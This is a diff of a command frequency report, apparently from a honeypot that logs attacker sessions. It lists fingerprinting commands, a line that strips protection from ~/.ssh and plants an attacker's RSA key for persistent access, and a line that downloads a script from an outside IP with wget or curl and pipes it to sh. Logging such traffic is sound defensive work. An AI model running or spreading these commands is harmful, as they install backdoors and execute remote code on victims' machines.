@@ -1,7 +1,13 @@
-Command Frequency (total: 252 commands, 5 unique)
+Command Frequency (total: 531 commands, 9 unique)
 ==================================================
-   57  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); ...
-   57  uname -s -v -n -m 2 > /dev/null
-   57  uname -m 2 > /dev/null
-   57  cat /proc/uptime 2 > /dev/null | cut -d. -f1
-   24  chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt...
+  249  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
+uname=$(uname -s -v -n -m 2>/dev/null)
+ar...
+  248  echo $HOME
+   10  cd ~; chattr -ia .ssh; lockr -ia .ssh
+   10  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1...
+    9  chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt...
+    2  ls
+    1  b'\xff\xfc\x01\xff\xfc\x06\xff\xfcadmin'
+    1  echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+    1  enablesystemshellsh(wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh...
